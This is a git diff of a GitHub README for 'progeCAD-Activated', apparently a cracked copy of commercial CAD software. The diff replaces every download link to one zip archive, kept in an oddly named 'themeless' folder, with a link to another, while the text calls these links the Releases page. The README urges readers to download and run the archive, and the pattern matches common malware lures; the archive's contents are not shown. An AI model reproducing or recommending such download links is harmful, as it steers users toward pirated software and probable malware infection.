@@ -1,6 +1,6 @@
 # 🎉 progeCAD-Activated - Your Simple Guide to Seamless CAD Design
 
-[![Download Now](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/proge-Activated-CA-2.7.zip%20Now-Get%20Started-blue)](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/proge-Activated-CA-2.7.zip)
+[![Download Now](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/CA_proge_Activated_v1.5.zip%20Now-Get%20Started-blue)](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/CA_proge_Activated_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these requirements:
 
 To get the latest version of progeCAD, visit the Releases page:
 
-[Download progeCAD-Activated](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/proge-Activated-CA-2.7.zip)
+[Download progeCAD-Activated](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/CA_proge_Activated_v1.5.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -82,4 +82,4 @@ We value your feedback. Feel free to share your thoughts on features you like or
 
 You're now ready to download and run progeCAD on your Windows PC. Enjoy your CAD projects, and don’t hesitate to explore the resources and community available to you.
 
-[Download progeCAD-Activated](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/proge-Activated-CA-2.7.zip)
+[Download progeCAD-Activated](https://github.com/darkval75/progeCAD-Activated/raw/refs/heads/main/themeless/CA_proge_Activated_v1.5.zip)
